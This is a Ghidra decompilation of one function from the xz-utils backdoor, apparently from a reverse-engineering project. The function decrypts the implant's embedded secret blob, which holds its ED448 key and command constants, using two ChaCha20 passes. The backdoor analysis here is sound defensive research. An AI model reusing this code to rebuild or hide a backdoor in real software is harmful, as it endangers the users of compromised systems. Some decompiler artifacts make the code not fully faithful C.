// /home/kali/xzre-ghidra/xzregh/1081D0_secret_data_get_decrypted.c
// Function: secret_data_get_decrypted @ 0x1081D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_get_decrypted(u8 * output, global_context_t * ctx)


/*
 * AutoDoc: Runs a two-stage ChaCha20 decrypt to recover the embedded secret-data blob using keys stored alongside the payload. Other helpers request it whenever they need the ED448 key or command constants.
 */

#include "xzre_types.h"

BOOL secret_data_get_decrypted(u8 *output,global_context_t *ctx)

{
  imported_funcs_t *funcs;
  BOOL BVar1;
  long lVar2;
  u8 *puVar3;
  key_buf *pkVar4;
  u8 auStack_b8 [32];
  key_buf buf1;
  key_buf buf2;
  u8 local_68 [80];
  
  if (output == (u8 *)0x0) {
    return FALSE;
  }
  if ((ctx != (global_context_t *)0x0) &&
     (funcs = ctx->imported_funcs, funcs != (imported_funcs_t *)0x0)) {
    puVar3 = auStack_b8;
    for (lVar2 = 0xc; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)puVar3 = 0;
      puVar3 = (u8 *)((long)puVar3 + 4);
    }
    pkVar4 = &buf2;
    for (lVar2 = 0x1c; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)pkVar4 = 0;
      pkVar4 = pkVar4 + 4;
    }
    BVar1 = chacha_decrypt(auStack_b8,0x30,auStack_b8,(u8 *)&buf1,(u8 *)&buf2,funcs);
    if (BVar1 != FALSE) {
      BVar1 = chacha_decrypt(ctx->secret_data,0x39,(u8 *)&buf2,local_68,output,ctx->imported_funcs);
      return (uint)(BVar1 != FALSE);
    }
  }
  return FALSE;
}

